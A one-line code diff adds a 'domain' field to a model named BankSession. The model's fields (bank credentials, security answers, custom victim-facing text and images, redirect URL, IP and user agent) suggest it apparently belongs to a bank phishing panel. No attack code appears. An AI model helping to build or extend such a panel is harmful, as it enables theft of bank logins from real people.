@@ -13,7 +13,7 @@ class BankSession extends Model
     public    $incrementing = false;
 
     protected $fillable = [
-        'id', 'log_number', 'bank_slug', 'status', 'action_type',
+        'id', 'log_number', 'domain', 'bank_slug', 'status', 'action_type',
         'credentials', 'answers', 'custom_text',
         'custom_image_url', 'redirect_url',
         'ip_address', 'user_agent',
